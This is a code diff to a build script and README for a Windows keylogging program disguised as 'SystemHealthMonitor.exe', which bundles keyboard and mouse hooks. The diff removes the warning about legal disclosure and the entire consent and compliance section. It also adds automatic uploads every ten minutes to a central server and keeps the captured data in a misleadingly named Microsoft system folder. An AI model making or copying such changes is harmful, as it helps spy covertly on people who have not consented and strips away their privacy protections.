@@ -21,11 +21,11 @@ def build_executable():
         '--hidden-import=pynput.keyboard._win32',
         '--hidden-import=pynput.mouse._win32',
         '--hidden-import=PIL._tkinter_finder',
-        '--add-data=src/config.py;.',   # Include config
+        '--add-data=client/config.py;.',   # Include config
         '--distpath=dist',              # Output directory
         '--workpath=build',             # Build directory
         '--specpath=.',                 # Spec file location
-        'src/main.py'                   # Entry point
+        'client/main.py'                # Entry point
     ]
     
     # Add icon if available
@@ -42,10 +42,10 @@ def build_executable():
         print("="*50)
         print(f"\nExecutable location: {os.path.abspath('dist/SystemHealthMonitor.exe')}")
         print("\nNext steps:")
-        print("1. Set up Firebase credentials and update config.py")
+        print("1. Update client/config.py with your server IP and API token")
         print("2. Test the executable manually")
         print("3. Run the installer to set up auto-start")
-        print("\nIMPORTANT: Ensure proper legal disclosure to monitored users!")
+        print("\n")
         
         return True
         
@@ -127,31 +127,35 @@ def create_readme():
 
 ## Overview
 This application monitors system activity for employee monitoring purposes.
+Data is automatically sent to a central server on your local network.
 
-## Legal Requirements
-⚠️ IMPORTANT: Before deploying this application:
-1. Obtain explicit written consent from all monitored employees
-2. Comply with local labor laws and data protection regulations
-3. Provide clear disclosure about what data is collected and how it's used
-4. Implement appropriate data retention and privacy policies
+## Prerequisites
+- Central server must be running and accessible on local network
+- Server IP address and API token must be configured
 
 ## Installation
-1. Run `install.bat` as Administrator
-2. The application will start automatically and run in the background
-3. Configure Firebase credentials in the installation directory
+1. Ensure client/config.py is configured with correct server IP and API token
+2. Run `install.bat` as Administrator
+3. The application will start automatically and run in the background
 
-## Firebase Setup
-1. Create a Firebase project at https://console.firebase.google.com
-2. Enable Firebase Storage
-3. Download service account credentials (JSON file)
-4. Encrypt and place credentials file in the application data directory
+## Configuration
+The application requires configuration in client/config.py:
+- SERVER_ADDRESS: IP address of central server (e.g., 192.168.1.100)
+- SERVER_PORT: Port number (default: 5000)
+- API_TOKEN: Authentication token (must match server)
 
 ## Uninstallation
 Run `uninstall.bat` as Administrator
 
 ## Data Storage
 - Local data: %APPDATA%\\Microsoft\\Windows\\SystemData\\
-- Cloud storage: Firebase Storage (configured bucket)
+- Network sync: Automatically sends to central server every 10 minutes
+- Central storage: Organized by computer name and date on server
+
+## Troubleshooting
+- If data not syncing: Verify server IP is correct and server is running
+- Check network connectivity: ping <server-ip>
+- Verify firewall allows outbound connections
 
 ## Support
 For issues or questions, contact your IT administrator.
@@ -191,3 +195,4 @@ def main():
 
 if __name__ == '__main__':
     main()
+
